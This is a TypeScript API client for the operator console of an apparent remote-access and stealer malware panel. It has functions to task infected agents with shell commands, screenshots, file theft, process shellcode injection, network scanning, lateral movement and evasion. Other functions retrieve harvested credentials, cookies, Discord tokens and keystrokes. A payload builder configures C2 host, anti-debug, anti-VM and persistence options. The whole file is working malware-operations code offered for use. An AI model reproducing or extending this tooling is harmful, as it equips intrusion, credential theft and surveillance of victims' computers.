import type { Agent, Task, FileTransfer, Credential, Cookie, DiscordToken, Keystroke, Screenshot, ProcessInfo, LateralMove, EvasionAction, Module, PayloadConfig, BuildResult } from '@/types'
import { normalizeAgent, normalizeAgents } from '@/lib/utils'

const API_BASE = import.meta.env.VITE_API_BASE ?? (import.meta.env.DEV ? 'http://localhost:8080' : '')

export type LiveStats = {
  agents_total: number
  agents_active: number
  agents_stale: number
  agents_offline: number
  agents_elevated: number
  tasks_pending: number
  tasks_completed: number
  tasks_failed: number
  uptime_seconds: number
}

export type LiveSnapshot = {
  ts: string
  durable: boolean
  store: string
  stats: LiveStats
  agents: any[]
  tasks: any[]
  ws: boolean
  poll_ms: number
  server_ok: boolean
}
function deriveWsBase(): string {
  if (import.meta.env.VITE_WS_BASE) return import.meta.env.VITE_WS_BASE as string
  if (API_BASE) {
    try {
      const u = new URL(API_BASE, typeof location !== 'undefined' ? location.href : 'http://localhost')
      u.protocol = u.protocol === 'https:' ? 'wss:' : 'ws:'
      return u.origin
    } catch {
      /* fall through */
    }
  }
  if (import.meta.env.DEV) return 'ws://localhost:8081'
  if (typeof location !== 'undefined') {
    return `${location.protocol === 'https:' ? 'wss' : 'ws'}://${location.host}`
  }
  return ''
}
const WS_BASE = deriveWsBase()

class ApiClient {
  private token: string | null = null
  private ws: WebSocket | null = null
  private messageHandlers: Map<string, Set<(data: any) => void>> = new Map()
  private reconnectAttempts = 0
  private maxReconnectAttempts = 5
  private reconnectDelay = 1000
  private agentId: string | null = null

  setToken(token: string | null) {
    this.token = token
    if (token) {
      localStorage.setItem('auth_token', token)
    } else {
      localStorage.removeItem('auth_token')
    }
  }

  getToken(): string | null {
    if (!this.token) {
      this.token = localStorage.getItem('auth_token')
    }
    return this.token
  }

  private async request<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
    const token = this.getToken()
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      ...(options.headers as Record<string, string>),
    }
    if (token) {
      headers['Authorization'] = `Bearer ${token}`
    }

    const response = await fetch(`${API_BASE}${endpoint}`, {
      ...options,
      headers,
    })

    if (response.status === 401) {
      // Do NOT clear the token and bounce to /login here. On a serverless host a
      // cold start can answer the first poll with 401 while the session is still
      // perfectly valid, and the live poll runs every few seconds — a redirect in
      // this branch turns one hiccup into an instant logout loop. PrivateRoute
      // already gates the SPA; checkAuth() owns the real sign-out.
      const error = await response.json().catch(() => ({ error: 'Unauthorized', message: 'Unauthorized' }))
      const err = new Error(error.error || error.message || 'Unauthorized')
      ;(err as Error & { status?: number }).status = 401
      throw err
    }

    if (!response.ok) {
      const error = await response.json().catch(() => ({ message: 'Request failed' }))
      throw new Error(error.error || error.Error || error.message || 'Request failed')
    }

    return response.json()
  }

  // Auth
  async login(username: string, password: string): Promise<{ token: string; user: { username: string; role?: 'owner' | 'operator' } }> {
    const result = await this.request<{ token: string; user: { username: string; role?: 'owner' | 'operator' } }>('/api/auth/login', {
      method: 'POST',
      body: JSON.stringify({ username, password }),
    })
    this.setToken(result.token)
    return result
  }

  async logout(): Promise<void> {
    try {
      await this.request('/api/auth/logout', { method: 'POST' })
    } catch {
      /* ignore */
    }
    this.setToken(null)
  }

  async register(username: string, password: string, email?: string): Promise<{ token: string; user: { username: string; role?: 'owner' | 'operator' } }> {
    const result = await this.request<{ token: string; user: { username: string; role?: 'owner' | 'operator' } }>('/api/auth/register', {
      method: 'POST',
      body: JSON.stringify({ username, password, email: email || '' }),
    })
    this.setToken(result.token)
    return result
  }

  async listOperators(): Promise<Array<{ id: string; username: string; email: string; role: string; created_at: string; last_login?: string; last_ip?: string }>> {
    return this.request('/api/operators')
  }

  async me(): Promise<{ username: string; role: string; email?: string; created_at?: string }> {
    return this.request('/api/auth/me')
  }

  async updateSettings(body: { email?: string; current_password?: string; new_password?: string }): Promise<{ ok: boolean }> {
    return this.request('/api/auth/settings', { method: 'POST', body: JSON.stringify(body) })
  }

  async recover(license: string, password: string, username?: string): Promise<{ token: string; user: { username: string; role?: string } }> {
    const result = await this.request<{ token: string; user: { username: string; role?: string } }>('/api/auth/recover', {
      method: 'POST',
      body: JSON.stringify({ license, password, username: username || '' }),
    })
    this.setToken(result.token)
    return result
  }

  async getPayloadHistory(): Promise<Array<{ id: string; filename: string; size: number; status: string; created_at: string }>> {
    const raw = await this.request<any>('/api/payloads/history')
    const rows = Array.isArray(raw) ? raw : (raw?.payloads || raw?.data || [])
    return rows.map((r: any) => ({
      id: String(r.id ?? r.ID ?? ''),
      filename: String(r.filename ?? r.Filename ?? 'payload'),
      size: Number(r.size ?? r.Size ?? 0),
      status: String(r.status ?? r.Status ?? ''),
      created_at: String(r.created_at ?? r.CreatedAt ?? ''),
    }))
  }

  payloadDownloadUrl(id: string): string {
    return `${API_BASE}/api/payloads/${encodeURIComponent(id)}/download`
  }

  async getOperator(id: string): Promise<{ id: string; username: string; email: string; role: string; created_at: string; last_login?: string; last_ip?: string }> {
    return this.request(`/api/operators/${id}`)
  }

  async getStats(): Promise<{ active_agents: number; total_agents: number; pending_tasks: number; completed_today: number; uptime_ms: number }> {
    return this.request('/api/stats')
  }

  // One poll target for the whole console: agents + stats + recent tasks in a
  // single response, so no two panels on screen disagree about the same moment.
  async live(): Promise<LiveSnapshot> {
    return this.request<LiveSnapshot>('/api/live')
  }

  // Agents
  async getAgents(): Promise<Agent[]> {
    const raw = await this.request<any>('/api/agents')
    return normalizeAgents(raw)
  }

  async getAgent(id: string): Promise<Agent> {
    const raw = await this.request<any>(`/api/agents/${id}`)
    return normalizeAgent(raw)
  }

  async deleteAgent(id: string): Promise<void> {
    return this.request<void>(`/api/agents/${id}`, { method: 'DELETE' })
  }

  // Tasks
  async getTasks(agentId: string): Promise<Task[]> {
    return this.request<Task[]>(`/api/agents/${agentId}/tasks`)
  }

  async getTask(taskId: string): Promise<any> {
    return this.request<any>(`/api/tasks/${taskId}`)
  }

  async executeShell(agentId: string, command: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/shell`, {
      method: 'POST',
      body: JSON.stringify({ command }),
    })
  }

  async takeScreenshot(agentId: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/screenshot`, {
      method: 'POST',
    })
  }

  async sleep(agentId: string, seconds: number): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/sleep`, {
      method: 'POST',
      body: JSON.stringify({ seconds }),
    })
  }

  async uninstall(agentId: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/uninstall`, {
      method: 'POST',
    })
  }

  async updateAgentBinary(agentId: string, url: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/update`, {
      method: 'POST',
      body: JSON.stringify({ url }),
    })
  }

  // File Transfers
  async getFileTransfers(agentId: string): Promise<FileTransfer[]> {
    return this.request<FileTransfer[]>(`/api/agents/${agentId}/files`)
  }

  async downloadFile(agentId: string, path: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/files/download`, {
      method: 'POST',
      body: JSON.stringify({ path }),
    })
  }

  async uploadFile(agentId: string, path: string, data: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/files/upload`, {
      method: 'POST',
      body: JSON.stringify({ path, data }),
    })
  }

  async listDirectory(agentId: string, path: string): Promise<{ files: FileTransfer[] }> {
    return this.request<{ files: FileTransfer[] }>(`/api/agents/${agentId}/files/list`, {
      method: 'POST',
      body: JSON.stringify({ path }),
    })
  }

  // Credentials
  async getCredentials(agentId: string): Promise<Credential[]> {
    return this.request<Credential[]>(`/api/agents/${agentId}/credentials`)
  }

  // Cookies
  async getCookies(agentId: string): Promise<Cookie[]> {
    return this.request<Cookie[]>(`/api/agents/${agentId}/cookies`)
  }

  // Discord Tokens
  async getDiscordTokens(agentId: string): Promise<DiscordToken[]> {
    return this.request<DiscordToken[]>(`/api/agents/${agentId}/discord`)
  }

  // Keystrokes
  async getKeystrokes(agentId: string): Promise<Keystroke[]> {
    return this.request<Keystroke[]>(`/api/agents/${agentId}/keystrokes`)
  }

  // Screenshots
  async getScreenshots(agentId: string): Promise<Screenshot[]> {
    return this.request<Screenshot[]>(`/api/agents/${agentId}/screenshots`)
  }

  // Processes
  async getProcesses(agentId: string): Promise<ProcessInfo[]> {
    return this.request<ProcessInfo[]>(`/api/agents/${agentId}/processes`)
  }

  async suspendProcess(agentId: string, pid: number): Promise<void> {
    return this.request<void>(`/api/agents/${agentId}/processes/suspend`, {
      method: 'POST',
      body: JSON.stringify({ pid }),
    })
  }

  async resumeProcess(agentId: string, pid: number): Promise<void> {
    return this.request<void>(`/api/agents/${agentId}/processes/resume`, {
      method: 'POST',
      body: JSON.stringify({ pid }),
    })
  }

  async killProcess(agentId: string, pid: number): Promise<void> {
    return this.request<void>(`/api/agents/${agentId}/processes/kill`, {
      method: 'POST',
      body: JSON.stringify({ pid }),
    })
  }

  async injectProcess(agentId: string, pid: number, shellcode: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/processes/inject`, {
      method: 'POST',
      body: JSON.stringify({ pid, shellcode }),
    })
  }

  // Lateral Movement
  async getLateralMoves(agentId: string): Promise<LateralMove[]> {
    return this.request<LateralMove[]>(`/api/agents/${agentId}/lateral`)
  }

  async scanNetwork(agentId: string, subnet: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/lateral/scan`, {
      method: 'POST',
      body: JSON.stringify({ subnet }),
    })
  }

  async executeLateralMove(agentId: string, opts: { technique: string; target: string; credentials_id?: string }): Promise<any> {
    return this.request(`/api/agents/${agentId}/lateral`, {
      method: 'POST',
      body: JSON.stringify(opts),
    })
  }

  async executeEvasion(agentId: string, technique: string): Promise<any> {
    return this.request(`/api/agents/${agentId}/evasion`, {
      method: 'POST',
      body: JSON.stringify({ technique }),
    })
  }

  async listEvasionTechniques(): Promise<any[]> {
    return this.request('/api/evasion/techniques')
  }

  // Evasion
  async getEvasionResults(agentId: string): Promise<EvasionAction[]> {
    return this.request<EvasionAction[]>(`/api/agents/${agentId}/evasion`)
  }

  async runEvasion(agentId: string, technique: string, target: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/evasion/run`, {
      method: 'POST',
      body: JSON.stringify({ technique, target }),
    })
  }

  // Modules
  async getModules(agentId: string): Promise<Module[]> {
    return this.request<Module[]>(`/api/agents/${agentId}/modules`)
  }

  async loadModule(agentId: string, moduleId: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/modules/load`, {
      method: 'POST',
      body: JSON.stringify({ module_id: moduleId }),
    })
  }

  async unloadModule(agentId: string, moduleId: string): Promise<Task> {
    return this.request<Task>(`/api/agents/${agentId}/modules/unload`, {
      method: 'POST',
      body: JSON.stringify({ module_id: moduleId }),
    })
  }

  // Payload Building
  async buildPayload(config: PayloadConfig, binary?: File | null): Promise<BuildResult> {
    const token = this.getToken()
    const form = new FormData()
    if (binary) form.append('binary', binary)
    form.append('c2_host', config.ServerHost)
    form.append('c2_port', String(config.ServerPort))
    form.append('use_tls', (config.UseTLS || config.ServerPort === 443) ? 'true' : 'false')
    form.append('platform', config.Platform)
    form.append('anti_debug', config.AntiDebug ? 'true' : 'false')
    form.append('anti_vm', config.AntiVM ? 'true' : 'false')
    form.append('key', config.EncryptedComms ? (config.EncryptionKey || '') : '')
    form.append('injection_method', config.ProcessInjection ? (config.InjectionMethod || 'crt') : 'none')
    form.append('persistence', config.Persistence ? 'true' : 'false')
    form.append('hide_console', config.HideConsole === false ? 'false' : 'true')
    form.append('sleep_interval', String(config.SleepInterval || 60))
    form.append('jitter', String(config.Jitter ?? 10))
    if (config.CustomConfig) form.append('custom_config', config.CustomConfig)

    const headers: Record<string, string> = {}
    if (token) headers['Authorization'] = `Bearer ${token}`

    const response = await fetch(`${API_BASE}/api/payloads/build`, {
      method: 'POST',
      headers,
      body: form,
    })
    const raw = await response.json().catch(() => ({}))
    if (!response.ok) {
      throw new Error(raw.error || raw.Error || raw.message || 'Build failed')
    }
    return {
      Success: Boolean(raw.Success ?? raw.success ?? raw.id),
      BinaryPath: String(raw.BinaryPath ?? raw.url ?? ''),
      BinaryName: String(raw.BinaryName ?? raw.filename ?? ''),
      Size: Number(raw.Size ?? raw.size ?? 0),
      Checksum: String(raw.Checksum ?? raw.checksum ?? ''),
      Error: String(raw.Error ?? raw.error ?? ''),
      DownloadB64: raw.DownloadB64 ? String(raw.DownloadB64) : undefined,
    }
  }

  async uploadAgentBinary(file: File, platform: 'windows' | 'linux'): Promise<{ success: boolean; path: string }> {
    const formData = new FormData()
    formData.append('file', file)
    formData.append('platform', platform)

    const token = this.getToken()
    const headers: Record<string, string> = {}
    if (token) {
      headers['Authorization'] = `Bearer ${token}`
    }

    const response = await fetch(`${API_BASE}/api/payloads/upload`, {
      method: 'POST',
      headers,
      body: formData,
    })

    if (!response.ok) {
      const error = await response.json().catch(() => ({ message: 'Upload failed' }))
      throw new Error(error.message || 'Upload failed')
    }

    return response.json()
  }

  // WebSocket
  connectWS(agentId?: string): Promise<void> {
    return new Promise((resolve, reject) => {
      if (this.ws?.readyState === WebSocket.OPEN) {
        resolve()
        return
      }

      this.agentId = agentId || null
      const wsUrl = `${WS_BASE}/ws${agentId ? `?agent_id=${agentId}` : ''}`
      this.ws = new WebSocket(wsUrl)

      this.ws.onopen = () => {
        console.log('WebSocket connected')
        this.reconnectAttempts = 0
        resolve()
      }

      this.ws.onmessage = (event) => {
        try {
          const message = JSON.parse(event.data)
          this.handleMessage(message)
        } catch (error) {
          console.error('Failed to parse WebSocket message:', error)
        }
      }

      this.ws.onclose = () => {
        console.log('WebSocket disconnected')
        this.attemptReconnect()
      }

      this.ws.onerror = (error) => {
        console.error('WebSocket error:', error)
        if (this.reconnectAttempts === 0) {
          reject(error)
        }
      }
    })
  }

  private attemptReconnect() {
    if (this.reconnectAttempts >= this.maxReconnectAttempts) {
      console.log('Max reconnect attempts reached')
      return
    }

    this.reconnectAttempts++
    const delay = this.reconnectDelay * Math.pow(2, this.reconnectAttempts - 1)
    console.log(`Reconnecting in ${delay}ms (attempt ${this.reconnectAttempts})`)

    setTimeout(() => {
      this.connectWS(this.agentId || undefined).catch(() => {})
    }, delay)
  }

  private handleMessage(message: { type: string; data?: any; task?: any; agent?: any; file?: any }) {
    // hub frames payloads as {type, task|agent|file} — unwrap them so handlers
    // get the entity directly instead of undefined
    const payload = message.data ?? message.task ?? message.agent ?? message.file ?? message
    const handlers = this.messageHandlers.get(message.type)
    if (handlers) {
      handlers.forEach((handler) => handler(payload))
    }
  }

  onMessage(type: string, handler: (data: any) => void): () => void {
    if (!this.messageHandlers.has(type)) {
      this.messageHandlers.set(type, new Set())
    }
    this.messageHandlers.get(type)!.add(handler)
    return () => this.offMessage(type, handler)
  }

  offMessage(type: string, handler?: (data: any) => void) {
    if (handler) {
      this.messageHandlers.get(type)?.delete(handler)
    } else {
      this.messageHandlers.delete(type)
    }
  }

  sendMessage(type: string, data: any) {
    if (this.ws?.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify({ type, data }))
    }
  }

  disconnectWS() {
    if (this.ws) {
      this.ws.close()
      this.ws = null
    }
  }

  isConnected(): boolean {
    return this.ws?.readyState === WebSocket.OPEN
  }
}

export const api = new ApiClient()